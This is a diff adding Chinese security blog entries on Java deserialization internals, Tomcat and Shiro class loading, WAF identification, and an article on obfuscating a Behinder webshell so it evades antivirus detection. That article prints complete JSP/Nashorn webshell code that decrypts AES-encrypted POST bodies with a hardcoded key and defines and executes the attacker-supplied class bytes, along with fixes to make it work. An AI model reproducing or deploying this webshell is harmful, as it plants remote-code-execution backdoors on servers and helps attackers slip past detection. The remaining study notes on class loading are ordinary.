@@ -5180,7 +5180,38 @@ replace（&apos;将要更改的字符串&apos;,&apos;被替换掉的字符串&ap
 <p><img src="/2021/11/01/%E5%8D%81%E6%9C%88%E6%95%B4%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/1/image-20211008155409591.png" alt="image-20211008155409591"></p>
 <p><img src="/2021/11/01/%E5%8D%81%E6%9C%88%E6%95%B4%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/1/image-20211008173525838.png" alt="image-20211008173525838">答案在这里。使用tomcat的类查询机制。 详见tomcat 的委派机值 ，Thread.getCurrentThread.getClassLoader。这个方法  按照道理webClassLoader是可以加载在Web-inf下的class的 但是这个类会解析成entry 而不是像urlclassloader的classpath 所以对</p>
 <p><img src="/2021/11/01/%E5%8D%81%E6%9C%88%E6%95%B4%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/1/20200624164228-a27cf462-b5f6-1.png" alt="img"></p>
-<p>这个fqcn的名字无法返回，他会解析成[Lorg/apache…这样，导致前面无法生成类，去后面的根的Urlclassloader加载，导致找不到路径。</p>
+<p>这个fqcn的名字无法返回，他会解析成[Lorg/apache…这样，导致前面无法生成类，去后面的根的Urlclassloader加载，导致找不到路径。(函数返回值和参数的编码。这种编码叫做JNI字段描述符)</p>
+<p><strong>关于网上大多数人赞同的帖子</strong></p>
+<p><a href="https://xz.aliyun.com/t/7950#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/7950#toc-3</a></p>
+<p><img src="/2021/11/01/%E5%8D%81%E6%9C%88%E6%95%B4%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/1/blog/source/_posts/%E5%8D%81%E6%9C%88%E6%95%B4%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/image-20211104145118116.png" alt="image-20211104145118116"></p>
+<p>只是下了断点  都没走到这一步 直接贴我的图:(后面被打脸)</p>
+<p><img src="/2021/11/01/%E5%8D%81%E6%9C%88%E6%95%B4%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/1/blog/source/_posts/%E5%8D%81%E6%9C%88%E6%95%B4%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/image-20211104145020557.png" alt="image-20211104145020557"></p>
+<p>很明显可以看到这里的delegateLoad的参数是false,也就是说根本不回走到1178行的内容.</p>
+<p><img src="/2021/11/01/%E5%8D%81%E6%9C%88%E6%95%B4%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/1/blog/source/_posts/%E5%8D%81%E6%9C%88%E6%95%B4%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/image-20211104145412485.png" alt="image-20211104145412485"></p>
+<p>delegate的意思是委派,可以看到delege参数在对象初始化的时候的值就是false.再来看看filter方法.这里似乎要执行什么包触发器之类的操作,但是可以看到这里面的对象参数为空.而且在类的初始化的时候,就将这个空数组传入了.</p>
+<p><img src="/2021/11/01/%E5%8D%81%E6%9C%88%E6%95%B4%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/1/blog/source/_posts/%E5%8D%81%E6%9C%88%E6%95%B4%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/image-20211104145823422.png" alt="image-20211104145823422"></p>
+<p><img src="/2021/11/01/%E5%8D%81%E6%9C%88%E6%95%B4%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/1/blog/source/_posts/%E5%8D%81%E6%9C%88%E6%95%B4%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/image-20211104150030002.png" alt="image-20211104150030002"></p>
+<p>并且我通篇看下来delegate和pakeageTrigger这俩参数没有方法去改,并且都是protect的变量.并且父类也是没有修改的地方.不知道是在本包的其他的什么地方,或者是反射的地方做的什么手脚了.</p>
+<p><img src="/2021/11/01/%E5%8D%81%E6%9C%88%E6%95%B4%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/1/blog/source/_posts/%E5%8D%81%E6%9C%88%E6%95%B4%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/image-20211104152007212.png" alt="image-20211104152007212"></p>
+<p>写了这么多,啪啪打脸= =.原来是找错地方了..</p>
+<p><img src="/2021/11/01/%E5%8D%81%E6%9C%88%E6%95%B4%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/1/blog/source/_posts/%E5%8D%81%E6%9C%88%E6%95%B4%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/image-20211104152255239.png" alt="image-20211104152255239"></p>
+<p><img src="/2021/11/01/%E5%8D%81%E6%9C%88%E6%95%B4%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/1/blog/source/_posts/%E5%8D%81%E6%9C%88%E6%95%B4%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/image-20211104161951581.png" alt="image-20211104161951581"></p>
+<p>结论正确 .</p>
+<p><strong>补充结论:</strong></p>
+<p><code>Class.forName</code>不支持原生类型，但其他类型都是支持的。<code>Class.loadClass</code>不能加载原生类型和数组类型Class.forName不支持原生类型，但其他类型都是支持的。Class.loadClass不能加载原生类型和数组类型.</p>
+<p><strong>补充拓展:</strong></p>
+<p>后续对反序列化底层进行分析的时候,无意间学到了resolveClass这个方法,这个方法会调用Class.forName();而上述可以看到,shiro其实重写了resloveClass这个方法.看这个Stream类是继承ObjecttInputStream这个类的,只重写了resolveClass这个方法,在调用readObject这个函数的时候,会调用resolveClass方法.因为shiro在这里重写了这个方法,所以会优先调用这个重写的.</p>
+<p><img src="/2021/11/01/%E5%8D%81%E6%9C%88%E6%95%B4%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/1/blog/source/_posts/%E5%8D%81%E6%9C%88%E6%95%B4%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/image-20211104104136383.png" alt="image-20211104104136383"></p>
+<p>接着上上图,ExceptIgnoringAccessor中的loadClass方法,图中的cl是org.apache.catalina.loader.ParallelWebappClassLoader类.我们去寻找一下他的loadClass方法在哪. Class.forName和ClassLoader.loadclass 这两个是类加载的方法,但是机制确实不一样的.其实主要的原因也并不是在于初始化类,而是loadclass当中的可以看到上文ucp的路径和需要序列化的类名不匹配导致的问题.</p>
+<h4 id><a href="#" class="headerlink" title></a></h4><h4 id="Java中new和Class-forName的区别"><a href="#Java中new和Class-forName的区别" class="headerlink" title="Java中new和Class.forName的区别"></a>Java中new和Class.forName的区别</h4><p>首先：<br>New = Class.forName(“pacage.A”).newInstance();</p>
+<p>new是关键字，直接创建对象。<br>Class.forName()是一个方法，要求JVM查找并加载指定的类,类装载到虚拟机上之后，静态方法和静态块中的处理被执行。<br>这时候还没有创建对象。newInstance()是创建对象。</p>
+<p>我们最常用的jdbc, 经常会用Class.forName来加载数据库驱动。</p>
+<p>jdbc接口中，会存在各种数据库的驱动，不在在接口中写死，一般都写在配置文件里，<br>所以需要我们调用的时候通过Class.forName来加载驱动。这时候不需要创建对象，所有没有调用newInstance()</p>
+<p><a href="https://cloud.tencent.com/developer/article/1415203这个是类加载机器中,Class.forname和Classloader.loadClass的区别.实际Class.forname直接调用forName0" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1415203这个是类加载机器中,Class.forname和Classloader.loadClass的区别.实际Class.forname直接调用forName0</a>(className, true, ClassLoader.getClassLoader(caller), caller).而loadClassClassLoader.loadClass(className,false);false参数表示不连接,也就是仅仅将.class文件加载到JVM中不连接也不初始化.</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private static native Class&lt;?&gt; forName0(String name, boolean initialize,</span><br><span class="line">                                        ClassLoader loader,</span><br><span class="line">                                        Class&lt;?&gt; caller)</span><br></pre></td></tr></table></figure>
+
+
+
 <h2 id="如何识别WAF"><a href="#如何识别WAF" class="headerlink" title="如何识别WAF#"></a>如何识别WAF<a href="https://www.secquan.org/Discuss/1070396#0X01-如何识别WAF" target="_blank" rel="noopener">#</a></h2><h3 id="识别waf技术"><a href="#识别waf技术" class="headerlink" title="识别waf技术"></a>识别waf技术</h3><ul>
 <li>一些WAF在请求中设置自己的cookie（例如Citrix,Netscaler,Yunsuo WAF,safedog）</li>
 <li>有些人将自己与单独的<strong>标头关联</strong>（例如Anquanbao WAF,AmazonAWSWAF）。</li>
@@ -5209,6 +5240,95 @@ replace（&apos;将要更改的字符串&apos;,&apos;被替换掉的字符串&ap
 <h3 id="为什么lookup之后，registry会反连我们的jrmpServer？-详情"><a href="#为什么lookup之后，registry会反连我们的jrmpServer？-详情" class="headerlink" title="为什么lookup之后，registry会反连我们的jrmpServer？#详情"></a>为什么lookup之后，registry会反连我们的jrmpServer？<a href="https://www.anquanke.com/post/id/197829#h3-8" target="_blank" rel="noopener">#详情</a></h3><p>RemoteObjectInvocationHandler就是第一种方法，我们将AnnotationInvocationHandler替换成RemoteObjectInvocationHandler。在反序列化时会调用RemoteObjectInvocationHandler的父类RemoteObject的readObject函数，再调用其中的readExternal函数。</p>
 <p><img src="/2021/11/01/%E5%8D%81%E6%9C%88%E6%95%B4%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/1/image-20211015171238793.png" alt="image-20211015171238793"></p>
 <p><a href="http://www.mamicode.com/info-detail-2252602.html" target="_blank" rel="noopener">http://www.mamicode.com/info-detail-2252602.html</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>java/1/1</title>
+    <url>/2021/03/20/java/1/1/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>java反序列化杂谈/1</title>
+    <url>/2021/11/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9D%82%E8%B0%88/1/</url>
+    <content><![CDATA[<h1 id="反序列化杂谈"><a href="#反序列化杂谈" class="headerlink" title="反序列化杂谈"></a>反序列化杂谈</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>看了些shiro环境因为重写了resolveClass的方法导致很多链无法利用后，终于搞清楚了原理。所以想搞清楚反序列化底层究竟是怎么回事。基础打牢对后面的反序列化的问题才会有更深刻的认实。</p>
+<h2 id="0x01-使用场景"><a href="#0x01-使用场景" class="headerlink" title="0x01 使用场景"></a>0x01 使用场景</h2><p>抓取数据包的时候，很多数据是非常直观的，所以使用场景内对参数的敏感程度非常重要。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、 http参数，cookie，sesion，存储方式可能是base64（rO0），压缩后的base64（H4sl），MII（(Media Independent Interface(介质无关接口)；或称为媒体独立接口?没遇到过）等</span><br><span class="line">2、 Servlets HTTP，Sockets，Session管理器 包含的协议就包括JMX，RMI，JMS，JNDI等（\xac\xed）</span><br><span class="line">3、 xml Xstream,XMLDecoder等（HTTP Body：Content-Type:application&#x2F;xml）</span><br><span class="line">4、 json(Jackson，fastjson) http请求中包含</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x02-readObject方法分析"><a href="#0x02-readObject方法分析" class="headerlink" title="0x02 readObject方法分析"></a>0x02 readObject方法分析</h2><p>在前面先贴一张<code>readObject</code>的执行流程图，这是一张weblogic的反序列化执行流程图。第一个<code>readObject</code>直接忽略，到下篇文weblogic再做讲解。</p>
+<p><img src="/2021/11/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9D%82%E8%B0%88/1/blog/source/_posts/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9D%82%E8%B0%88/1993669-20201213092006278-1532192089.png" alt="img"></p>
+<p><img src="/2021/11/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9D%82%E8%B0%88/1/blog/source/_posts/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9D%82%E8%B0%88/c3743848a2037753a296923c4c79106a.png" alt="img"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">resolveClass:686, ObjectInputStream (java.io)</span><br><span class="line">readNonProxyDesc:1868, ObjectInputStream (java.io)</span><br><span class="line">readClassDesc:1751, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:2042, ObjectInputStream (java.io)</span><br><span class="line">readObject0:1573, ObjectInputStream (java.io)</span><br><span class="line">readObject:431, ObjectInputStream (java.io)</span><br><span class="line">main:15, TestSerial (serial)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/11/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9D%82%E8%B0%88/1/blog/source/_posts/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9D%82%E8%B0%88/image-20211105103418851.png" alt="image-20211105103418851">可以看到这里Class.forName不进行类的初始化，只是获得这个类对象。所以这里我们static代码块是不会被执行的。</p>
+<p>接下来走出这个函数，走进这个函数，一看这个函数就是要初始化什么东西，我们再详细看看里面的参数的关键参数：</p>
+<p><img src="/2021/11/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9D%82%E8%B0%88/1/blog/source/_posts/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9D%82%E8%B0%88/image-20211105103719835.png" alt="image-20211105103719835"></p>
+<p><img src="/2021/11/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9D%82%E8%B0%88/1/blog/source/_posts/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9D%82%E8%B0%88/image-20211105103809585.png" alt="image-20211105103809585"></p>
+<p>ObjectStreamClass Filed参数里面的Integer的age 和String类型的name；剩下的就是name和序列化的suid。<br>cl参数是一个class类，那关键的肯定是name参数和classloader，决定这个类是由哪个类加载器加载，这里可以很清楚的看到是应用类加载器。剩下的两个参数都是null。</p>
+<p><img src="/2021/11/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9D%82%E8%B0%88/1/blog/source/_posts/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9D%82%E8%B0%88/image-20211105110714595.png" alt="image-20211105110714595"></p>
+<p>这个方法一执行完，我静态代码块里的计算机就跳出来了。</p>
+<p><img src="/2021/11/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9D%82%E8%B0%88/1/blog/source/_posts/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9D%82%E8%B0%88/image-20211105110853066.png" alt="image-20211105110853066"></p>
+<p>就是里面的这句话。entry是个Object用来接收参数。</p>
+<p><img src="/2021/11/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9D%82%E8%B0%88/1/blog/source/_posts/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9D%82%E8%B0%88/image-20211105111449805.png" alt="image-20211105111449805"></p>
+<p><img src="/2021/11/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9D%82%E8%B0%88/1/blog/source/_posts/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9D%82%E8%B0%88/image-20211105111437945.png" alt="image-20211105111437945"></p>
+<p>执行了一堆初始化，直到最后一句执行完才生成计算机。</p>
+<p><img src="/2021/11/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9D%82%E8%B0%88/1/blog/source/_posts/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9D%82%E8%B0%88/image-20211105111629514.png" alt="image-20211105111629514"></p>
+<p>我觉得是这个类的实例在生成的时候，内部类cl也要去实例化，导致的static代码块的触发。</p>
+<p>回到readOrdinaryObject方法，这里将这个类newInstance()了，但是静态代码块的方法在前面就执行了。<code>这里的newInstance是调用ObjectStreamClass的newInstance</code></p>
+<p><img src="/2021/11/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9D%82%E8%B0%88/1/blog/source/_posts/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9D%82%E8%B0%88/image-20211105110519183.png" alt="image-20211105110519183"></p>
+<p><img src="/2021/11/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9D%82%E8%B0%88/1/blog/source/_posts/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9D%82%E8%B0%88/image-20211105140554154.png" alt="image-20211105140554154"></p>
+<p>然后在这个方法把序列化的数据填充进去</p>
+<p><img src="/2021/11/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9D%82%E8%B0%88/1/blog/source/_posts/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9D%82%E8%B0%88/image-20211105140656141.png" alt="image-20211105140656141"></p>
+<h3 id="resolveClass这个方法究竟是做什么的"><a href="#resolveClass这个方法究竟是做什么的" class="headerlink" title="resolveClass这个方法究竟是做什么的?"></a>resolveClass这个方法究竟是做什么的?</h3><p>将类的序列化描述符加工成该类的 Class 对象。</p>
+<h3 id="resolveClass和resolveProxyClass有什么区别"><a href="#resolveClass和resolveProxyClass有什么区别" class="headerlink" title="resolveClass和resolveProxyClass有什么区别?"></a>resolveClass和resolveProxyClass有什么区别?</h3>]]></content>
+  </entry>
+  <entry>
+    <title>十一月整理的问题/冰蝎的混淆与简单免杀/1</title>
+    <url>/2021/11/22/%E5%8D%81%E4%B8%80%E6%9C%88%E6%95%B4%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/%E5%86%B0%E8%9D%8E%E7%9A%84%E6%B7%B7%E6%B7%86%E4%B8%8E%E7%AE%80%E5%8D%95%E5%85%8D%E6%9D%80/1/</url>
+    <content><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>java因为语言上面的特性，在关键词上面始终很难再去做到免杀。比如Class.forName、getMethod、setAccessable、invoke、newInstance等一些方法。所以我认为在免杀中最需要突破的两个方向就是:1、java对象的生成。[这里不管是用各种类去调用他们的defineClass也好，还是类配合上方法或者构造器生成出的对象也好]2、关键词的绕过，不知道js中是否有这样的特性可以支持将这些函数给绕过。</p>
+<h1 id="0x02-正文"><a href="#0x02-正文" class="headerlink" title="0x02 正文"></a>0x02 正文</h1><h3 id="1、免杀"><a href="#1、免杀" class="headerlink" title="1、免杀"></a>1、免杀</h3><p>直接上免杀马分析。</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"javax.script.ScriptEngine"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"javax.script.ScriptEngineManager"</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    ScriptEngine engine = <span class="keyword">new</span> ScriptEngineManager().getEngineByName(<span class="string">"JavaScript"</span>); <span class="comment">//主要思路就是通过ScriptEngine执行JS代码</span></span><br><span class="line">    U demo = <span class="keyword">new</span> U(<span class="keyword">this</span>.getClass().getClassLoader()); <span class="comment">//在里面将会是调用webClassLoader去define这个class</span></span><br><span class="line">    engine.put(<span class="string">"request"</span>,request);</span><br><span class="line">    engine.put(<span class="string">"response"</span>,response); <span class="comment">//这句可以不需要</span></span><br><span class="line">    engine.put(<span class="string">"session"</span>, session);</span><br><span class="line">    engine.put(<span class="string">"pageContext"</span>,pageContext); <span class="comment">//而且所有的参数可以pageContext里面取 上面其实可以都不需要 这几句的内容都是将engine里面放入初始化的变量，而这些变量都是从jsp中传入的。</span></span><br><span class="line">    engine.put(<span class="string">"U"</span>,demo);<span class="comment">//初始化engine的一些参数变量。</span></span><br><span class="line">    <span class="comment">// 将代码放在这里面进行执行</span></span><br><span class="line">    <span class="built_in">String</span> command = <span class="string">"try &#123;\n"</span> +</span><br><span class="line">            <span class="string">"  load(\"nashorn:mozilla_compat.js\");\n"</span> + <span class="comment">//实现Import的功能,由于JDK8使用importPackage需要通过load进行导入mozilla_compat.js，但JDK7则没有load函数，所以使用下面的语句import在JDK7下运行会报错。</span></span><br><span class="line">            <span class="string">"&#125; catch (e) &#123;&#125;\n"</span> +</span><br><span class="line">            <span class="string">"importPackage(Packages.java.util);\n"</span> +</span><br><span class="line">            <span class="string">"importPackage(Packages.java.lang);\n"</span> +</span><br><span class="line">            <span class="string">"importPackage(Packages.javax.crypto);\n"</span> +</span><br><span class="line">            <span class="string">"importPackage(Packages.sun.misc);\n"</span> +</span><br><span class="line">            <span class="string">"importPackage(Packages.javax.crypto.spec);\n"</span> +</span><br><span class="line">            <span class="string">"function define(classBytes)&#123;\n"</span> +</span><br><span class="line">            <span class="string">"  \n"</span> +</span><br><span class="line">            <span class="string">"  var defineClassMethod =U.getClass().getDeclaredMethod(\"g\",classBytes.getClass());\n"</span> +</span><br><span class="line">            <span class="string">"  print(defineClassMethod)\n"</span> +</span><br><span class="line">            <span class="string">"  defineClassMethod.setAccessible(true);\n"</span> +</span><br><span class="line">            <span class="string">"  var cc=defineClassMethod.invoke(U,new Array(classBytes));\n"</span> + <span class="comment">//JS类型和JAVA的类型转换出现了错误</span></span><br><span class="line">            <span class="string">"  cc.newInstance().equals(pageContext);\n"</span> +</span><br><span class="line">            <span class="string">"&#125;\n"</span> +</span><br><span class="line">            <span class="string">"if (request.getMethod().equals(\"POST\"))&#123;\n"</span> +</span><br><span class="line">            <span class="string">"      var k=new java.lang.String(\"e45e329feb5d925b\");\n"</span> +</span><br><span class="line">            <span class="string">"      session.putValue(\"u\",k);\n"</span> +</span><br><span class="line">            <span class="string">"      var c=Cipher.getInstance(\"AES\");\n"</span> +</span><br><span class="line">            <span class="string">"      c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));\n"</span> +</span><br><span class="line">            <span class="string">"      define(c.doFinal(new BASE64Decoder().decodeBuffer(request.getReader().readLine())));\n"</span> +</span><br><span class="line">            <span class="string">"&#125;"</span>; <span class="comment">//而且既然放在了js里面，这些字符串都是可以通过混淆的方式去绕过检测。所以最主要的还是在外面的eval和defineClaass里面了。</span></span><br><span class="line">    engine.eval(command);</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">U</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span></span>&#123;</span><br><span class="line">        U(ClassLoader c)&#123;</span><br><span class="line">            <span class="keyword">super</span>(c);</span><br><span class="line">        &#125;</span><br><span class="line">        public Class g(byte []b)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">super</span>.defineClass(b,<span class="number">0</span>,b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>再考虑之前的步骤，一些关键点还是需要着重强调一下。主要分为：1、 js和java在转换上面不兼容的问题。2、attempted duplicate class definition for name</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">  load(<span class="string">"nashorn:mozilla_compat.js"</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">importPackage(Packages.java.util);</span><br><span class="line">importPackage(Packages.java.lang);</span><br><span class="line">importPackage(Packages.javax.crypto);</span><br><span class="line">importPackage(Packages.sun.misc);</span><br><span class="line">importPackage(Packages.javax.crypto.spec);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">define</span>(<span class="params">classBytes</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> byteArray = Java.type(<span class="string">"byte[]"</span>);</span><br><span class="line">  <span class="keyword">var</span> int = Java.type(<span class="string">"int"</span>);</span><br><span class="line">  <span class="keyword">var</span> defineClassMethod = java.lang.ClassLoader.class.getDeclaredMethod(</span><br><span class="line">    <span class="string">"defineClass"</span>,</span><br><span class="line">    byteArray.class,</span><br><span class="line">    int.class,</span><br><span class="line">    int.class</span><br><span class="line">  );</span><br><span class="line">  defineClassMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="keyword">var</span> cc = defineClassMethod.invoke(</span><br><span class="line">    Thread.currentThread().getContextClassLoader(),</span><br><span class="line">    classBytes,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    classBytes.length</span><br><span class="line">  );</span><br><span class="line">  <span class="keyword">return</span> cc.getConstructor().newInstance().equals(pageContext);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (request.getMethod().equals(<span class="string">"POST"</span>))&#123;</span><br><span class="line">      <span class="keyword">var</span> k=<span class="string">"39236cce7e199d43"</span>;</span><br><span class="line">      session.putValue(<span class="string">"u"</span>,k);</span><br><span class="line">      <span class="keyword">var</span> c=Cipher.getInstance(<span class="string">"AES"</span>);</span><br><span class="line">      c.init(<span class="number">2</span>,<span class="keyword">new</span> SecretKeySpec(k.getBytes(),<span class="string">"AES"</span>));</span><br><span class="line">      define(c.doFinal(<span class="keyword">new</span> BASE64Decoder().decodeBuffer(request.getReader().readLine())))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的马漏了定义Class U的声明。这里的defineClass，每次define的都是类名为U的class，所以会导致loader的父类WebAppClassLoader每次都是去定义Class u，所以第二次定义的时候会报错：attempted duplicate class definition for name。<strong>冰蝎的解决方案是每次都使用不同的classLoader去定义Class U这个类。（等会考证一下）</strong></p>
+<p>第二次生成的U对象。</p>
+<p><img src="/2021/11/22/%E5%8D%81%E4%B8%80%E6%9C%88%E6%95%B4%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/%E5%86%B0%E8%9D%8E%E7%9A%84%E6%B7%B7%E6%B7%86%E4%B8%8E%E7%AE%80%E5%8D%95%E5%85%8D%E6%9D%80/1/image-20211122160828559.png" alt="image-20211122160828559"></p>
+<p>第一次生成的U对象</p>
+<p><img src="/2021/11/22/%E5%8D%81%E4%B8%80%E6%9C%88%E6%95%B4%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/%E5%86%B0%E8%9D%8E%E7%9A%84%E6%B7%B7%E6%B7%86%E4%B8%8E%E7%AE%80%E5%8D%95%E5%85%8D%E6%9D%80/1/image-20211122160548485.png" alt="image-20211122160548485"></p>
+<p>可以看到每次传入的classloader都不相同。</p>
+<p><img src="/2021/11/22/%E5%8D%81%E4%B8%80%E6%9C%88%E6%95%B4%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/%E5%86%B0%E8%9D%8E%E7%9A%84%E6%B7%B7%E6%B7%86%E4%B8%8E%E7%AE%80%E5%8D%95%E5%85%8D%E6%9D%80/1/image-20211122163748563.png" alt="image-20211122163748563"></p>
+<p>一个类的url和签名组成了这个类的CodeSource，根据policy文件的配置，一个CodeSource有一定的权限。policy文件根据<code>类的url和类的签名</code>来确定类，指定权限。而一个类的ProtectionDomain在这个类加载的时候初始化，也就是上图的内容。也可以看到protectionDomain是preDefineClass的方法中传过来的，并且两个参数都为null。并且在这一步赋值[ClassLoader中的方法]。</p>
+<p><img src="/2021/11/22/%E5%8D%81%E4%B8%80%E6%9C%88%E6%95%B4%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/%E5%86%B0%E8%9D%8E%E7%9A%84%E6%B7%B7%E6%B7%86%E4%B8%8E%E7%AE%80%E5%8D%95%E5%85%8D%E6%9D%80/1/image-20211122164337465.png" alt="image-20211122164337465">    <img src="/2021/11/22/%E5%8D%81%E4%B8%80%E6%9C%88%E6%95%B4%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/%E5%86%B0%E8%9D%8E%E7%9A%84%E6%B7%B7%E6%B7%86%E4%B8%8E%E7%AE%80%E5%8D%95%E5%85%8D%E6%9D%80/1/image-20211122164437067.png" alt="image-20211122164437067"></p>
+<p><img src="/2021/11/22/%E5%8D%81%E4%B8%80%E6%9C%88%E6%95%B4%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/%E5%86%B0%E8%9D%8E%E7%9A%84%E6%B7%B7%E6%B7%86%E4%B8%8E%E7%AE%80%E5%8D%95%E5%85%8D%E6%9D%80/1/5b449bdc3073a.png" alt="5b449bdc3073a"></p>
+<p>所以出错的关键在这里</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var defineClassMethod &#x3D; java.lang.ClassLoader.class.getDeclaredMethod(</span><br><span class="line">  &quot;defineClass&quot;,</span><br><span class="line">  byteArray.class,</span><br><span class="line">  int.class,</span><br><span class="line">  int.class</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p>应该改为</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var defineClassMethod &#x3D;U.getClass().getDeclaredMethod(</span><br><span class="line">    &quot;g&quot;,</span><br><span class="line">    classBytes.getClass()</span><br><span class="line">  );</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="2、-混淆"><a href="#2、-混淆" class="headerlink" title="2、 混淆"></a>2、 混淆</h3><p>简单概括：</p>
+<p>1、 控制流平坦化</p>
+<p>2、 利用java ast技术结合数组和加密算法对混淆的实现。</p>
+<p>具体参考引用的第三篇文章    </p>
+<h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><p><a href="https://xz.aliyun.com/t/9715" target="_blank" rel="noopener">https://xz.aliyun.com/t/9715</a> 这篇主要是在本文思路的关键。</p>
+<p><a href="https://www.anquanke.com/post/id/151398" target="_blank" rel="noopener">https://www.anquanke.com/post/id/151398</a> </p>
+<p><a href="https://tttang.com/archive/1315/" target="_blank" rel="noopener">https://tttang.com/archive/1315/</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>十一月整理的问题/冰蝎3浅析/1</title>
+    <url>/2021/11/17/%E5%8D%81%E4%B8%80%E6%9C%88%E6%95%B4%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/%E5%86%B0%E8%9D%8E3%E6%B5%85%E6%9E%90/1/</url>
